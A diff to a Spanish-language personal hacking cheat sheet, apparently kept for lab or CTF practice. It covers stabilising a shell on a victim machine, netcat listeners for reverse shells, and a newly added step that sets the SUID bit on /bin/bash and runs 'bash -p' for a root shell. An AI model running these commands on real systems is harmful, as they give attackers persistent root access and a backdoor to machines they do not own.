@@ -9,6 +9,12 @@ Para tener una shell manejable (IMPORTANTE QUE SEA EN BASH NO SZSH):
 para setear las proporciones de una shell:
 	1. ver las proporciones de mi shell local -> ejecutar localmente = "stty -a"
 	2. ejecutar en la máquina victima = "stty rows <<rows mias>> columns <<columns mias>>"
+
+darle permisos SUUID a /bin/bash y ejecutar como root
+1. dar los permisos con "chmod 4755 /bin/bash"
+2. luego se ejecuta bash como root "/bin/bash -p"
+
+
 para poner a escuchar un puerto:
 	1. nc -nlvp <<port>>
 	2.1. stty raw -echo; (stty size; cat) | sudo nc -lvnp 443
